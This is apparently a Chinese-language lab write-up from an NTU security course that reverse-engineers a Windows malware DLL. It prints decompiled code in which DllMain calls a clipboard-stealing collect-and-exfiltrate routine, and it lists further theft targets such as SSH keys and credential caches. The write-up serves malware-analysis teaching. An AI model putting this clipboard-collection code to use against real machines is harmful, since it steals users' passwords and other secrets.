---
title: Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
tags: [eductf, CTF, Reverse]

category: "Security Course｜NTU CS｜Reverse｜WinMalware Lab"
date: 2024-01-31
---

# Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)
<!-- more -->

## Background
如果想要分析DLL，可以從以下三個地方切入
* _DllMainCRTStartup (DLL 載入和移除時的初始化與收尾)
    * DllMain / DllEntryPoint / CRT_INIT (function signature 相同)
    * 找有三個參數的 function call
    ![](https://hackmd.io/_uploads/Sk0GgCaz6.png)
    範例就大概像這樣，從`_DllMainCRTStartup`底下有`call _CRT_INIT`和`call DllEntryPoint`(`DllMain`在比較下面)
    ![](https://hackmd.io/_uploads/HklyZRTf6.png)
* Exported Functions
* TLS Callback
* [OpenClipboard](https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-openclipboard)
* [GetClipboardData](https://learn.microsoft.com/zh-tw/windows/win32/api/winuser/nf-winuser-getclipboarddata)
* [globalLock](https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-globallock)
* [\_itoa](https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/itoa-itow?view=msvc-170)

## Source Code
IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法
* DllMain
    ```cpp
    BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
    {
      if ( fdwReason == 1 )
      {
        MessageBoxA(0i64, "Reflective Dll Injection success. Remember to delete the persistence file", "eductf-lab", 0);
        my_main();    // 不重要的東西
        collect_and_exfiltrate();
      }
      return 1;
    }
    ```
* collect_and_exfiltrate
    ```cpp
    void collect_and_exfiltrate(void)
    {
      PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF

      pbInput = 0i64;
      collect_data(&pbInput);
      exfiltrate(pbInput);
    }
    ```
* collect_data
    ```cpp
    void __fastcall collect_data(char **pbInput)
    {
      char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF

      collect_get_clipboard_data(&pbInput_1);
      *pbInput = pbInput_1;
    }
    ```
* collect_get_clipboard_data
    ```cpp
    void __fastcall collect_get_clipboard_data(LPVOID *pbInput)
    {
      HANDLE ClipboardData; // rax
      void *v3; // rsi
      int LastError; // eax
      char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF

      if ( OpenClipboard(0i64) )
      {
        ClipboardData = GetClipboardData(1u);
        v3 = ClipboardData;
        if ( ClipboardData )
        {
          *pbInput = GlobalLock(ClipboardData);
          GlobalUnlock(v3);
        }
        else
        {
          LastError = GetLastError();
          _itoa(LastError, Buffer, 10);
        }
      }
      CloseClipboard();
    }
    ```

## Recon
目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢
1. 首先trace一下上面所有的code，會發現其實簡單到根本不用查MSDN也知道在幹嘛，就是把受害主機的剪貼簿打開，並取得這個剪貼簿的開頭指標，再回傳給`pbIntput`
2. 最後再傳給後續的exfiltrate function


目前的攻擊手法符合Mitre ATT&CK的[T1115](https://attack.mitre.org/techniques/T1115/)，剪貼簿中可能剛好有帳號、密碼、信用卡號之類的
除了剪貼簿，還能收集很多其他東西，像是：
* PDF、DOCX、XLSX、Email、Git source code
* SSH private key、Key logging、OS credential cache
* 麥克風、鏡頭、其他外接裝置
* 任何你想得到的資訊